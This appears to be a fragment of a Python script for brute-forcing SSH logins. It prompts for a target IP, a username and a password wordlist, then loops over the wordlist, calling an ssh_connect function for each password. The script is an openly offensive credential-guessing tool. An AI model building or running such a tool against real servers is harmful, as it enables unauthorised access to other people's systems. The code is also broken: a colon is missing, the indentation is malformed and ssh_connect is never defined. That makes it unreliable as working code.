import paramiko, sys, os, socket, termcolor

host = input('[+] Enter the IP of target: ')
username = input('[+] Enter the SSH username: ')
wordlist = input('[+] Path to wordlist: ')

if os.path.exists(wordlist) == False:
    print('[!!] Invalid path or wordlist not found. ')
    sys.exit(1)

with open(wordlist, 'r') as file:
    for line in file.readlines()
        passw = line.strip()
            try:
                ssh_connect(passw)